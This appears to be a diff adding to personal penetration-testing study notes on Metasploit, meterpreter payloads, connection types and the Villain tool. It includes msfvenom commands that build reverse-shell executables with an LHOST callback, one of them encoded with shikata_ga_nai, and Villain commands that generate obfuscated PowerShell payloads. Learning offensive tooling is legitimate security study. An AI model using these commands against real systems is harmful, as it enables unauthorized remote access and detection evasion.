@@ -35,4 +35,27 @@ ___
 	- Acunetix
 	- OpenVAS
 	- Nmap with NSE
-- Metasploit
+- Metasploit    (ruby)      msfconsole, msfdb, msfconsole -q  ------>search     ---->use   ----->run
+	- show info,   show options
+	- Msfvenom (msfvenom -l payloads)  (msfvenom -p window/meterpreter/reverse_tcp LHOST=wlan0 LPORT=2222 -f exe > top.exe)  top.elf
+	- Msfconsole
+	- Msfdb
+- Payload  
+	- window/meterpreter/reverse_tcp
+	- linux/x86/meterpreter/reverse_tcp
+	- OSX/x86/meterpreter/reverse_tcp
+	- android/meterpreter/reverse_tcp
+	- freebsd/x86/meterpreter/reverse_tcp
+- Connection types
+	- Reverse TCP
+	- Bind TCP
+	- Reverse HTTPS
+	- Bind HTTPS
+- payloads
+	- Staged payload  (window/meterpreter/reverse_tcp)
+	- Non-Staged payloads (window/meterpreter_reverse_tcp)
+- msfvenom -p window/meterpreter/reverse_tcp LPORT=2222 LHOST=wlan0 -f exe -e x86/shikata_ga_nai > rtop.exe
+---
+- villain   (create payload powershell)
+	- generate os=windows lhost=wlan0  obfuscate
+	- generate os=windows lhost=wlan0  encode
